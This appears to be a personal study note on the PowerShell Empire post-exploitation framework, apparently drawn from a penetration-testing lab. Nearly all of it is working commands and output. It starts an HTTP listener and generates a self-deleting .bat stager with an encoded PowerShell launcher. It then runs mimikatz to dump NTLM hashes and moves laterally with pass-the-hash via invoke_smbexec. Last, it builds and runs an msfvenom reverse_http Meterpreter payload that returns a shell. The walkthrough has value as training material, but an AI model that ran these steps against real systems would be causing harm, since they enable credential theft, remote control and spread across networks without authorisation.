# Powershell Empire

## Installation

```bash
sudo apt install powershell-empire starkiller
```

starkiller is the GUI for Powershell-Empire

## Commands

- `uselistener LISTENER`: To select a listener
- `options`: options
- `set OPTION VALUE`: to set options to the listener
- `set Name NAME`
​- `set Host`
​














## 23. PowerShell Empire

Empire is a “PowerShell and Python post-exploitation agent” with a heavy focus on client-side exploitation and post-exploitation of Active Directory (AD) deployments.

Require powershell 2.0, preinstalled from Windows 7

### Setup

```
$ cd /opt
$ sudo git clone https://github.com/PowerShellEmpire/Empire.git
Clonage dans 'Empire'...
remote: Enumerating objects: 12216, done.
remote: Total 12216 (delta 0), reused 0 (delta 0), pack-reused 12216
Réception d'objets: 100% (12216/12216), 22.14 Mio | 8.54 Mio/s, fait.
Résolution des deltas: 100% (8307/8307), fait.

$ cd Empire/
$ sudo ./setup/install.sh
$ sudo ./empire
Traceback (most recent call last):
 File "./empire", line 5, in <module>
 from flask import Flask, request, jsonify, make_response, abort, url_for
ImportError: No module named flask
```

So I use another method :
```
$ sudo apt install powershell-empire
$ sudo powershell-empire
================================================================================
 [Empire] Post-Exploitation Framework
================================================================================
 [Version] 3.8.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
================================================================================
 This build was released exclusively for Kali Linux | https://kali.org
================================================================================
 _______ .___ ___. .______ __ .______ _______
 | ____| | \/ | | _ \ | | | _ \ | ____|
 | |__   |  \ / | | |_) | | | | |_) | | |__
 | __|   | | \/| | | ___/ | | | / | __|
 | |____ | | | | | | | | | |\ \----.| |____
 |_______| |__| |__| | _| |__| | _| `._____||_______|
 319 modules currently loaded
 0 listeners currently active
 0 agents currently active

(Empire) >
```

### Help
```
(Empire) > help

Commands
========
agents Jump to the Agents menu.
creds Add/display credentials to/from the database.
exit Exit Empire
help Displays the help menu.
interact Interact with a particular agent.
list Lists active agents or listeners.
listeners Interact with active listeners.
load Loads Empire modules from a non-standard folder.
plugin Load a plugin file to extend Empire.
plugins List all available and active plugins.
preobfuscate Preobfuscate PowerShell module_source files
reload Reload one (or all) Empire modules.
report Produce report CSV and log files: sessions.csv, credentials.csv, mas
reset Reset a global option (e.g. IP whitelists).
resource Read and execute a list of Empire commands from a file.
searchmodule Search Empire module names/descriptions.
set Set a global option (e.g. IP whitelists).
show Show a global option (e.g. IP whitelists).
usemodule Use an Empire module.
usestager Use an Empire stager.
```

   ### 01 Listeners-and-stagers

Equivalent to Metasploit’s multi/handler, listeners accept inbound connections from various Empire agents

Stagers are small pieces of code generated by Empire that are executed on the victim and connect back to a listener. They set up a connection between the victim and the attacker and perform additional tasks to facilitate the transfer of a staged payload.

```
(Empire) > listeners
[!] No listeners currently active
```

#### List listeners :

```
(Empire: listeners) > uselistener[SPACE][TAB]
dbx http_com http_hop meterpreter
http http_foreign http_mapi redirector
```

#### Use listener

```
(Empire: listeners) > uselistener http
(Empire: listeners/http) > info
Name: HTTP[S]
Category: client_server
Authors:
@harmj0y
Description:
Starts a http[s] listener (PowerShell or Python) that uses a
GET/POST approach.
HTTP[S] Options:
Name Required Value Description
---- -------- ------- -----------
...
KillDate False Date for the listener to exit (MM/dd/yyyy).
Name True http Name for the listener.
Launcher True powershell -noP -sta -w 1 -enc Launcher string.
DefaultDelay True 5 Agent delay/reach back interval (in seconds).
DefaultLostLimit True 60 Number of missed checkins before exiting
WorkingHours False Hours for the agent to operate (09:00-17:00).
...
Host True http://10.11.0.4:80 Hostname/IP for staging.
CertPath False Certificate path for https listeners.
DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0).
Proxy False default Proxy to use for request (default, none, or other).
...
BindIP True 0.0.0.0 The IP to bind to on the control server.
Port True 80 Port for the listener.
ServerVersion True Microsoft-IIS/7.5 Server header for the control server.
...
```

#### Set variables

```
(Empire: listeners) > set Host 10.11.0.4

(Empire: listeners) >
```

#### Execute

```
(Empire: listeners/http) > execute
[*] Starting listener 'http'
* Serving Flask app "http" (lazy loading)
* Environment: production
WARNING: Do not use the development server in a production environment.
Use a production WSGI server instead.
* Debug mode: off
[+] Listener successfully started!

(Empire: listeners/http) > back

(Empire: listeners) > usestager
multi/bash osx/launcher windows/launcher_bat
multi/launcher osx/macho windows/launcher_lnk
multi/macro osx/macro windows/launcher_sct
multi/pyinstaller osx/pkg windows/launcher_vbs
multi/war osx/safari_launcher windows/launcher_xml
osx/applescript osx/teensy windows/macro
osx/application windows/bunny windows/macroless_msword
osx/ducky windows/dll windows/teensy
osx/dylib windows/ducky
osx/jar windows/hta

(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > info
Name: BAT Launcher
Description:
Generates a self-deleting .bat launcher for
Empire.
Options:
Name Required Value Description
---- -------- ------- -----------
Listener True Listener to generate stager for.
OutFile False /tmp/launcher.bat File to output .bat launcher to, otherwise displayed on the screen.
Obfuscate False False Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation type For powershell only.
ObfuscateCommand False Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscatio 
Only used if Obfuscate switch is True

For powershell only.

Language True powershell Language of the stager to generate.
ProxyCreds False default Proxy credentials ([domain\]username:password) to use f request (default, none, or other).
UserAgent False default User-agent string to use for the stag request (default, none, or other).
Proxy False default Proxy to use for request (default, no or other).
Delete False True Switch. Delete .bat after running.
StagerRetries False 0 Times for the stager to retry connecting.

Empire: stager/windows/launcher_bat) > set Listener http

(Empire: stager/windows/launcher_bat) > execute
[*] Stager output written out to: /tmp/launcher.bat

(Empire: stager/windows/launcher_bat) >
kali@kali:/opt/Empire$ cat /tmp/launcher.bat

@echo off
start /b powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBp...
start /b "" cmd /c del "%~f0"&exit /b
```

=> need to copy this stager to to target machine, and execute it

```
(Empire: stager/windows/launcher_bat) > [+] Initial agent S2Y5XW1L from 10.11.0.22 now

active (Slack)
```

Next, we can use the agents command to display all active agents.

```
(Empire: stager/windows/launcher_bat) > agents
[*] Active agents:
Name Lang Internal IP Machine Name Username Process Delay
--------- ---- ----------- ------------ --------- ------- -----
S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0
(Empire: agents) >

```

Interract with a stager :
```
(Empire: agents) > interact S2Y5XW1L

(Empire: S2Y5XW1L) > sysinfo

(Empire: S2Y5XW1L) > sysinfo:

0|http://10.11.0.4:80|corp|offsec|CLIENT251|10.11.0.22|Microsoft Windows 10
Pro|False|powershell|2976|powershell|5
Listener: [http://10.11.0.4:80](http://10.11.0.4:80)
Internal IP: 10.11.0.22
...

(Empire: S2Y5XW1L) > help
Agent Commands
==============
agents Jump to the agents menu.
back Go back a menu.
bypassuac Runs BypassUAC, spawning a new high-integrity agent for a listener.
clear Clear out agent tasking.
creds Display/return credentials from the database.
download Task an agent to download a file.
exit Task agent to exit.
help Displays the help menu or syntax for particular commands.
info Display information about this agent
injectshellcode Inject listener shellcode into a remote process. Ex. injectshellcode
jobs Return jobs or kill a running job.
kill Task an agent to kill a particular process name or ID.
killdate Get or set an agent's killdate (01/01/2016).
list Lists all active agents (or listeners).
listeners Jump to the listeners menu.
lostlimit Task an agent to change the limit on lost agent detection
main Go back to the main menu.
```


### Powershell modules   

In a stager :
```
(Empire: S2Y5XW1L) > usemodule

Display all 204 possibilities? (y or n)
code_execution/invoke_dllinjection
code_execution/invoke_metasploitpayload
code_execution/invoke_ntsd
code_execution/invoke_reflectivepeinjection
code_execution/invoke_shellcode
code_execution/invoke_shellcodemsil
collection/ChromeDump
collection/FoxDump
collection/USBKeylogger*
collection/WebcamRecorder
collection/browser_data
...

(Empire:2Y5XW1L) > usemodule situational_awareness/network/powerview/get_user

(powershell/situational_awareness/network/powerview/get_user) > info
Name: Get-DomainUser
Module: powershell/situational_awareness/network/powerview/get_user
NeedsAdmin: False
OpsecSafe: True
Language: powershell
MinLanguageVersion: 2
Background: True
OutputExtension: None
Authors:
@harmj0y
Description:
Query information for a given user or users in the specified domain. Part of PowerView.
Comments:
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/

Options:
Name Required Value Description
---- -------- ------- -----------
Domain False The domain to use for the query, defaults to the current domain.
LDAPFilter False Specifies an LDAP query string that is used to filter Active Directory objects.
ServerTimeLimit False Specifies the maximum amount of time the
...

(Empire: K678VC13) > usemodule credentials/mimikatz/logonpasswords

(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
Job started: NXK271
Hostname: client251.corp.com / S-1-5-21-3048852426-3234707088-723452474
mimikatz(powershell) # sekurlsa::logonpasswords
Authentication Id : 0 ; 244851 (00000000:0003bc73)
Session : Interactive from 1
User Name : offsec
Domain : corp
Logon Server : DC01
Logon Time : 2/20/2019 10:36:32 PM
SID : S-1-5-21-3048852426-3234707088-723452474-1103
msv :
[00000003] Primary
* Username : offsec
* Domain : corp
* NTLM : e2b475c11da2a0748290d87aa966c327
* SHA1 : 8c77f430e4ab8acb10ead387d64011c76400d26e
* DPAPI : c10c264a27b63c4e66728bbef4be8aab
tspkg :
wdigest :
* Username : offsec
* Domain : corp
* Password : (null)
kerberos :
* Username : offsec
* Domain : CORP.COM
* Password : (null)
ssp :
credman :
...

(Empire: K678VC13) > creds
Credentials:
CredID CredType Domain UserName Host Password
------ -------- ------ -------- ---- --------
1 hash corp.com offsec client251 e2b475c11da2a0748290d87aa966c32
2 hash corp.com CLIENT251$ client251 4d4ae0e7cb16d4cfe6a91412b3d80ed
```

### Lateral Movement   
```
(Empire: K678VC13) > usemodule lateral_movement/technique
inveigh_relay invoke_psremoting invoke_wmi
invoke_dcom invoke_smbexec invoke_wmi_debugger
invoke_executemsbuild invoke_sqloscmd jenkins_script_console
invoke_psexec invoke_sshcommand new_gpo_immediate_task

(Empire: K678VC13) > usemodule lateral_movement/invoke_smbexec

(Empire: powershell/lateral_movement/invoke_smbexec) > info
Name: Invoke-SMBExec
Module: powershell/lateral_movement/invoke_smbexec
NeedsAdmin: False
OpsecSafe: True
Language: powershell
MinLanguageVersion: 2
Background: False
OutputExtension: None
...
Options:
Name Required Value Description
---- -------- ------- -----------
CredID False CredID from the store to use.
ComputerName True Host[s] to execute the stager on, commaseparated.
Service False Name of service to create and delete. Defaults to 20 char random.
ProxyCreds False default Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
Username True Username.
Domain False Domain.
Hash True NTLM Hash in LM:NTLM or NTLM format.
Agent True K678VC13 Agent to run module on.
Listener True Listener to use.
...

(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName client251

(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http

(Empire: powershell/lateral_movement/invoke_smbexec) > set Username jeff_admin

(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash
e2b475c11da2a0748290d87aa966c327

(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com

(Empire: powershell/lateral_movement/invoke_smbexec) > execute

Command executed with service CVTERKCMPMMECQLRWLKB on client251
[*] Sending POWERSHELL stager (stage 1) to 10.11.0.22
[*] New agent UXVZ2NC3 checked in
[+] Initial agent UXVZ2NC3 from 10.11.0.22 now active (Slack)
...
```


### Switching Between Empire and Metasploit   
```
msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 633 bytes
Final size of exe file: 73802 bytes
Saved as: met.exe

msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http

msf5 exploit(multi/handler) > set LPORT 7777
LPORT => 7777

msf5 exploit(multi/handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 exploit(multi/handler) > exploit
[*] Started HTTP reverse handler on http://10.11.0.4:7777

Empire: S2Y5XW1L) > upload /home/kali/met.exe
[*] Tasked agent to upload met.exe, 72 KB
[*] Tasked S2Y5XW1L to run TASK_UPLOAD
[*] Agent S2Y5XW1L tasked with task ID 12
[*] Agent S2Y5XW1L returned results.
[*] Valid results returned by 10.11.0.22

Empire: S2Y5XW1L) > shell dir
[*] Tasked S2Y5XW1L to run TASK_SHELL
[*] Agent S2Y5XW1L tasked with task ID 3
[*] Agent S2Y5XW1L returned results.
Directory: C:\Users\offsec.corp\Downloads>
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 10/2/2019 11:24 AM 73802 met.exe
..Command execution completed.
[*] Valid results returned by 10.11.0.22

(Empire: S2Y5XW1L) > shell C:\Users\offsec.corp\Downloads>met.exe
[*] Tasked S2Y5XW1L to run TASK_SHELL
[*] Agent S2Y5XW1L tasked with task ID 5
[*] Agent S2Y5XW1L returned results.
..Command execution completed.
[*] Valid results returned by 10.11.0.22
```

With the executable running, we’ll switch back to our meterpreter listener and watch the incoming shell:

```
[*] Started HTTP reverse handler on [http://10.11.0.4:7777](http://10.11.0.4:7777)
[*] [http://10.11.0.4:7777](http://10.11.0.4:7777) handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 1 opened (10.11.0.4:7777 -> 10.11.0.22:50597)
meterpreter>
```



### Agents

for agent "H2WT86BX", All is logged in :

$ cat /var/lib/powershell-empire/downloads/H2WT86BX/agent.log